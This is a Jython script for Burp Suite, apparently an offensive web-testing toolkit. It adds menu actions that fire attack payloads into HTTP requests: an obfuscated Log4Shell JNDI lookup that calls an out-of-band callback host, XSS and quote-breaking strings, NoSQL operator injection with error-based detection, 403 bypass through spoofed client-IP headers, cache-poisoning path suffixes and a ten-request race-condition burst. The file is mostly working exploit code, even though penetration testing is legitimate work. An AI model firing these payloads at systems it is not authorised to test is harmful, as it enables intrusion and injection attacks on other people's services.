import copy
import json
import ssl
import urllib2

pool = RequestPool(10)


def base64Encode(selectedText):
    return base64encode(selectedText)


def unicodeEscape(selectedText):
    return selectedText.encode('utf-8').decode('unicode_escape')


def jsonUnicodeEscape(selectedText):
    json_object = json.loads(selectedText)
    return json.dumps(json_object, ensure_ascii=False, indent=2)


def log4shell(request):
    host = request.httpService().host()
    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + ".TOKEN.oastify.com:/a}"  # Replace it
    pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
    pool.run(sendRequest, modifyAllParamsValue(request, payload))
    for header in request.headers():
        if header.name().lower() not in ["cookie", "host","content-length"]:
            request = request.withHeader(header.name(), payload)
    pool.run(sendRequest, request)


def fuzzParamPerRequest(request):
    payload = "'\">"
    if request.contentType() == ContentType.JSON:
        for item in traverse_and_modify(json.loads(request.bodyToString().encode("utf-8")), payload):
            pool.run(sendRequest, request.withBody(json.dumps(item)))
    for param in request.parameters():
        if param.type() == HttpParameterType.JSON:
            continue
        pool.run(sendRequest, request.withParameter(parameter(param.name(), param.value() + payload, param.type())))


# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
# the main thread can continue executing other tasks without being blocked.
@run_in_thread
def fuzzParamsOneRequest(request):
    payload = "'\">"
    sendRequest(modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))


def bypass403(messageEditor):
    ip = "127.0.0.1"
    request = messageEditor.requestResponse().request()
    messageEditor.setRequest(request.withHeader("X-Forwarded-For", ip).withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip).withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip).withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip))


def purify_header(messageEditor):
    request = messageEditor.requestResponse().request()
    needless_headers = ["Upgrade-Insecure-Requests", "Cache-Control", "Accept", "User-Agent", "Accept-Encoding", "Accept-Language", "Connection"]
    for header in request.headers():
        if header.name().lower().startswith("sec-") or header.name() in needless_headers:
            request = request.withRemovedHeader(header.name())
    messageEditor.setRequest(request)


def insert_to_reflect_params(messageEditor):
    payload = "reflectplz'\">"
    request = messageEditor.requestResponse().request()
    response = messageEditor.requestResponse().response()
    body = response.bodyToString()
    for param in request.parameters():
        if (param.type() == HttpParameterType.BODY or param.type() == HttpParameterType.URL) and (param.value() in body or urldecode(param.value()) in body):
            request = request.withRemovedParameters(param).withParameter(parameter(param.name(), payload, param.type()))
    messageEditor.setRequest(request)


@run_in_pool(pool)
def no_sql_request(request):
    requestResponse = sendRequest(request)
    if requestResponse.response() is None:
        return
    body = requestResponse.response().bodyToString()
    for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
        if highlight in body:
            addIssue(auditIssue("NoSQL Injection", "String detail", "String remediation", requestResponse.request().url(),
                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight))))
            break


def noSqliScan(request):
    if request.body().length() > 5 and request.contentType() == ContentType.JSON:
        try:
            json_obj = json.loads(request.bodyToString().encode("utf-8"))
        except Exception:
            print(request.url(), "json loads error")
        else:
            for payload in traverse_and_modify(json_obj, {"$83b3j45b": "xxx"}):
                no_sql_request(request.withBody(json.dumps(payload)))
    if len(request.parameters()) > 0:
        for param in request.parameters():
            paramType = param.type()
            if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
                #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
                no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))


def insertAtCursor():
    return "'\"><img/src/onerror=alert(1)>"


@run_in_thread
def race_condition_10(request):
    sendRequests([request] * 10)


def registerContextMenu(menus):
    """
    To register a custom context menu using the register method,
    three parameters need to be passed: the menu name, the menu function, and the menu type.
    The menu types include CARET, SELECTED_TEXT, REQUEST, REQUEST_RESPONSE and MESSAGE_EDITOR.
    """
    menus.register("Purify Header", purify_header, MenuType.MESSAGE_EDITOR)
    menus.register("Bypass 403", bypass403, MenuType.MESSAGE_EDITOR)
    menus.register("Find Reflect Params", insert_to_reflect_params, MenuType.MESSAGE_EDITOR)

    menus.register("Base64 Encode", base64Encode, MenuType.SELECTED_TEXT)
    menus.register("Unicode Escape", unicodeEscape, MenuType.SELECTED_TEXT)
    menus.register("JSON Unicode Escape", jsonUnicodeEscape, MenuType.SELECTED_TEXT)

    menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)
    menus.register("Log4Shell", log4shell, MenuType.REQUEST)
    menus.register("FUZZ Param perReq", fuzzParamPerRequest, MenuType.REQUEST)
    menus.register("FUZZ Param oneReq", fuzzParamsOneRequest, MenuType.REQUEST)
    menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
    menus.register("Send to Xray", sendRequestWithProxy, MenuType.REQUEST)
    menus.register("File Extension Cache Poison", cachePoison, MenuType.REQUEST)

    menus.register("XSS At Cursor", insertAtCursor, MenuType.CARET)


def finish():
    pool.shutdown(timeout=1)


def cachePoison(request):
    for payload in ["%0d.css", "%0a.png", "%0a.json", "%0d.png", "%00.png", "%0d%0a.png"]:
        originPath = request.path()
        pool.run(sendRequest, request.withPath(originPath + payload))


# This code snippet is generated by OpenAI's ChatGPT language model.
def traverse_and_modify(node, new_value):
    result = []
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                sub_results = traverse_and_modify(value, new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[key] = sub_result
                    result.append(new_node)
            else:
                new_node = copy.deepcopy(node)
                new_node[key] = new_value
                result.append(new_node)
    elif isinstance(node, list):
        for i in range(len(node)):
            if isinstance(node[i], (dict, list)):
                sub_results = traverse_and_modify(node[i], new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[i] = sub_result
                    result.append(new_node)
    else:
        result.append(node)
    return result


def traverse_and_modify_all(node, new_value):
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                traverse_and_modify_all(value, new_value)
            else:
                node[key] = new_value
    elif isinstance(node, list):
        for item in node:
            traverse_and_modify(item, new_value)


@run_in_thread
def sendRequestWithProxy(request):
    proxy = "127.0.0.1:9999"
    method = request.method().encode()
    url = request.url().encode()
    headers = {}
    for header in request.headers():
        h = {header.name().encode(): header.value().encode()}
        headers.update(h)
    body = request.bodyToString().encode("utf-8")
    send_request_with_proxy(url, method, headers, body, proxy)


def send_request_with_proxy(url, method, headers, body, proxy):
    # Set the proxy information
    proxy_handler = urllib2.ProxyHandler({'http': proxy, 'https': proxy})
    context = ssl._create_unverified_context()
    https_handler = urllib2.HTTPSHandler(context=context)
    opener = urllib2.build_opener(proxy_handler, https_handler)
    urllib2.install_opener(opener)
    # Create and send the request through the proxy
    request = urllib2.Request(url, data=body, headers=headers)
    request.get_method = lambda: method
    response = urllib2.urlopen(request, timeout=8)
    print(url, response.getcode())


def modifyAllParamsValue(request, value, excluded=[]):
    body = request.bodyToString().encode("utf8")
    if request.contentType() == ContentType.JSON and len(body) > 5:
        try:
            json_body = json.loads(body)
            traverse_and_modify_all(json_body, value)
            request = request.withBody(json.dumps(json_body))
        except Exception:
            print(request.url(), "json loads error")
    for param in request.parameters():
        excluded.append(HttpParameterType.JSON)
        if param.type() in excluded:
            continue
        request = request.withParameter(parameter(param.name(), value, param.type()))
    return request
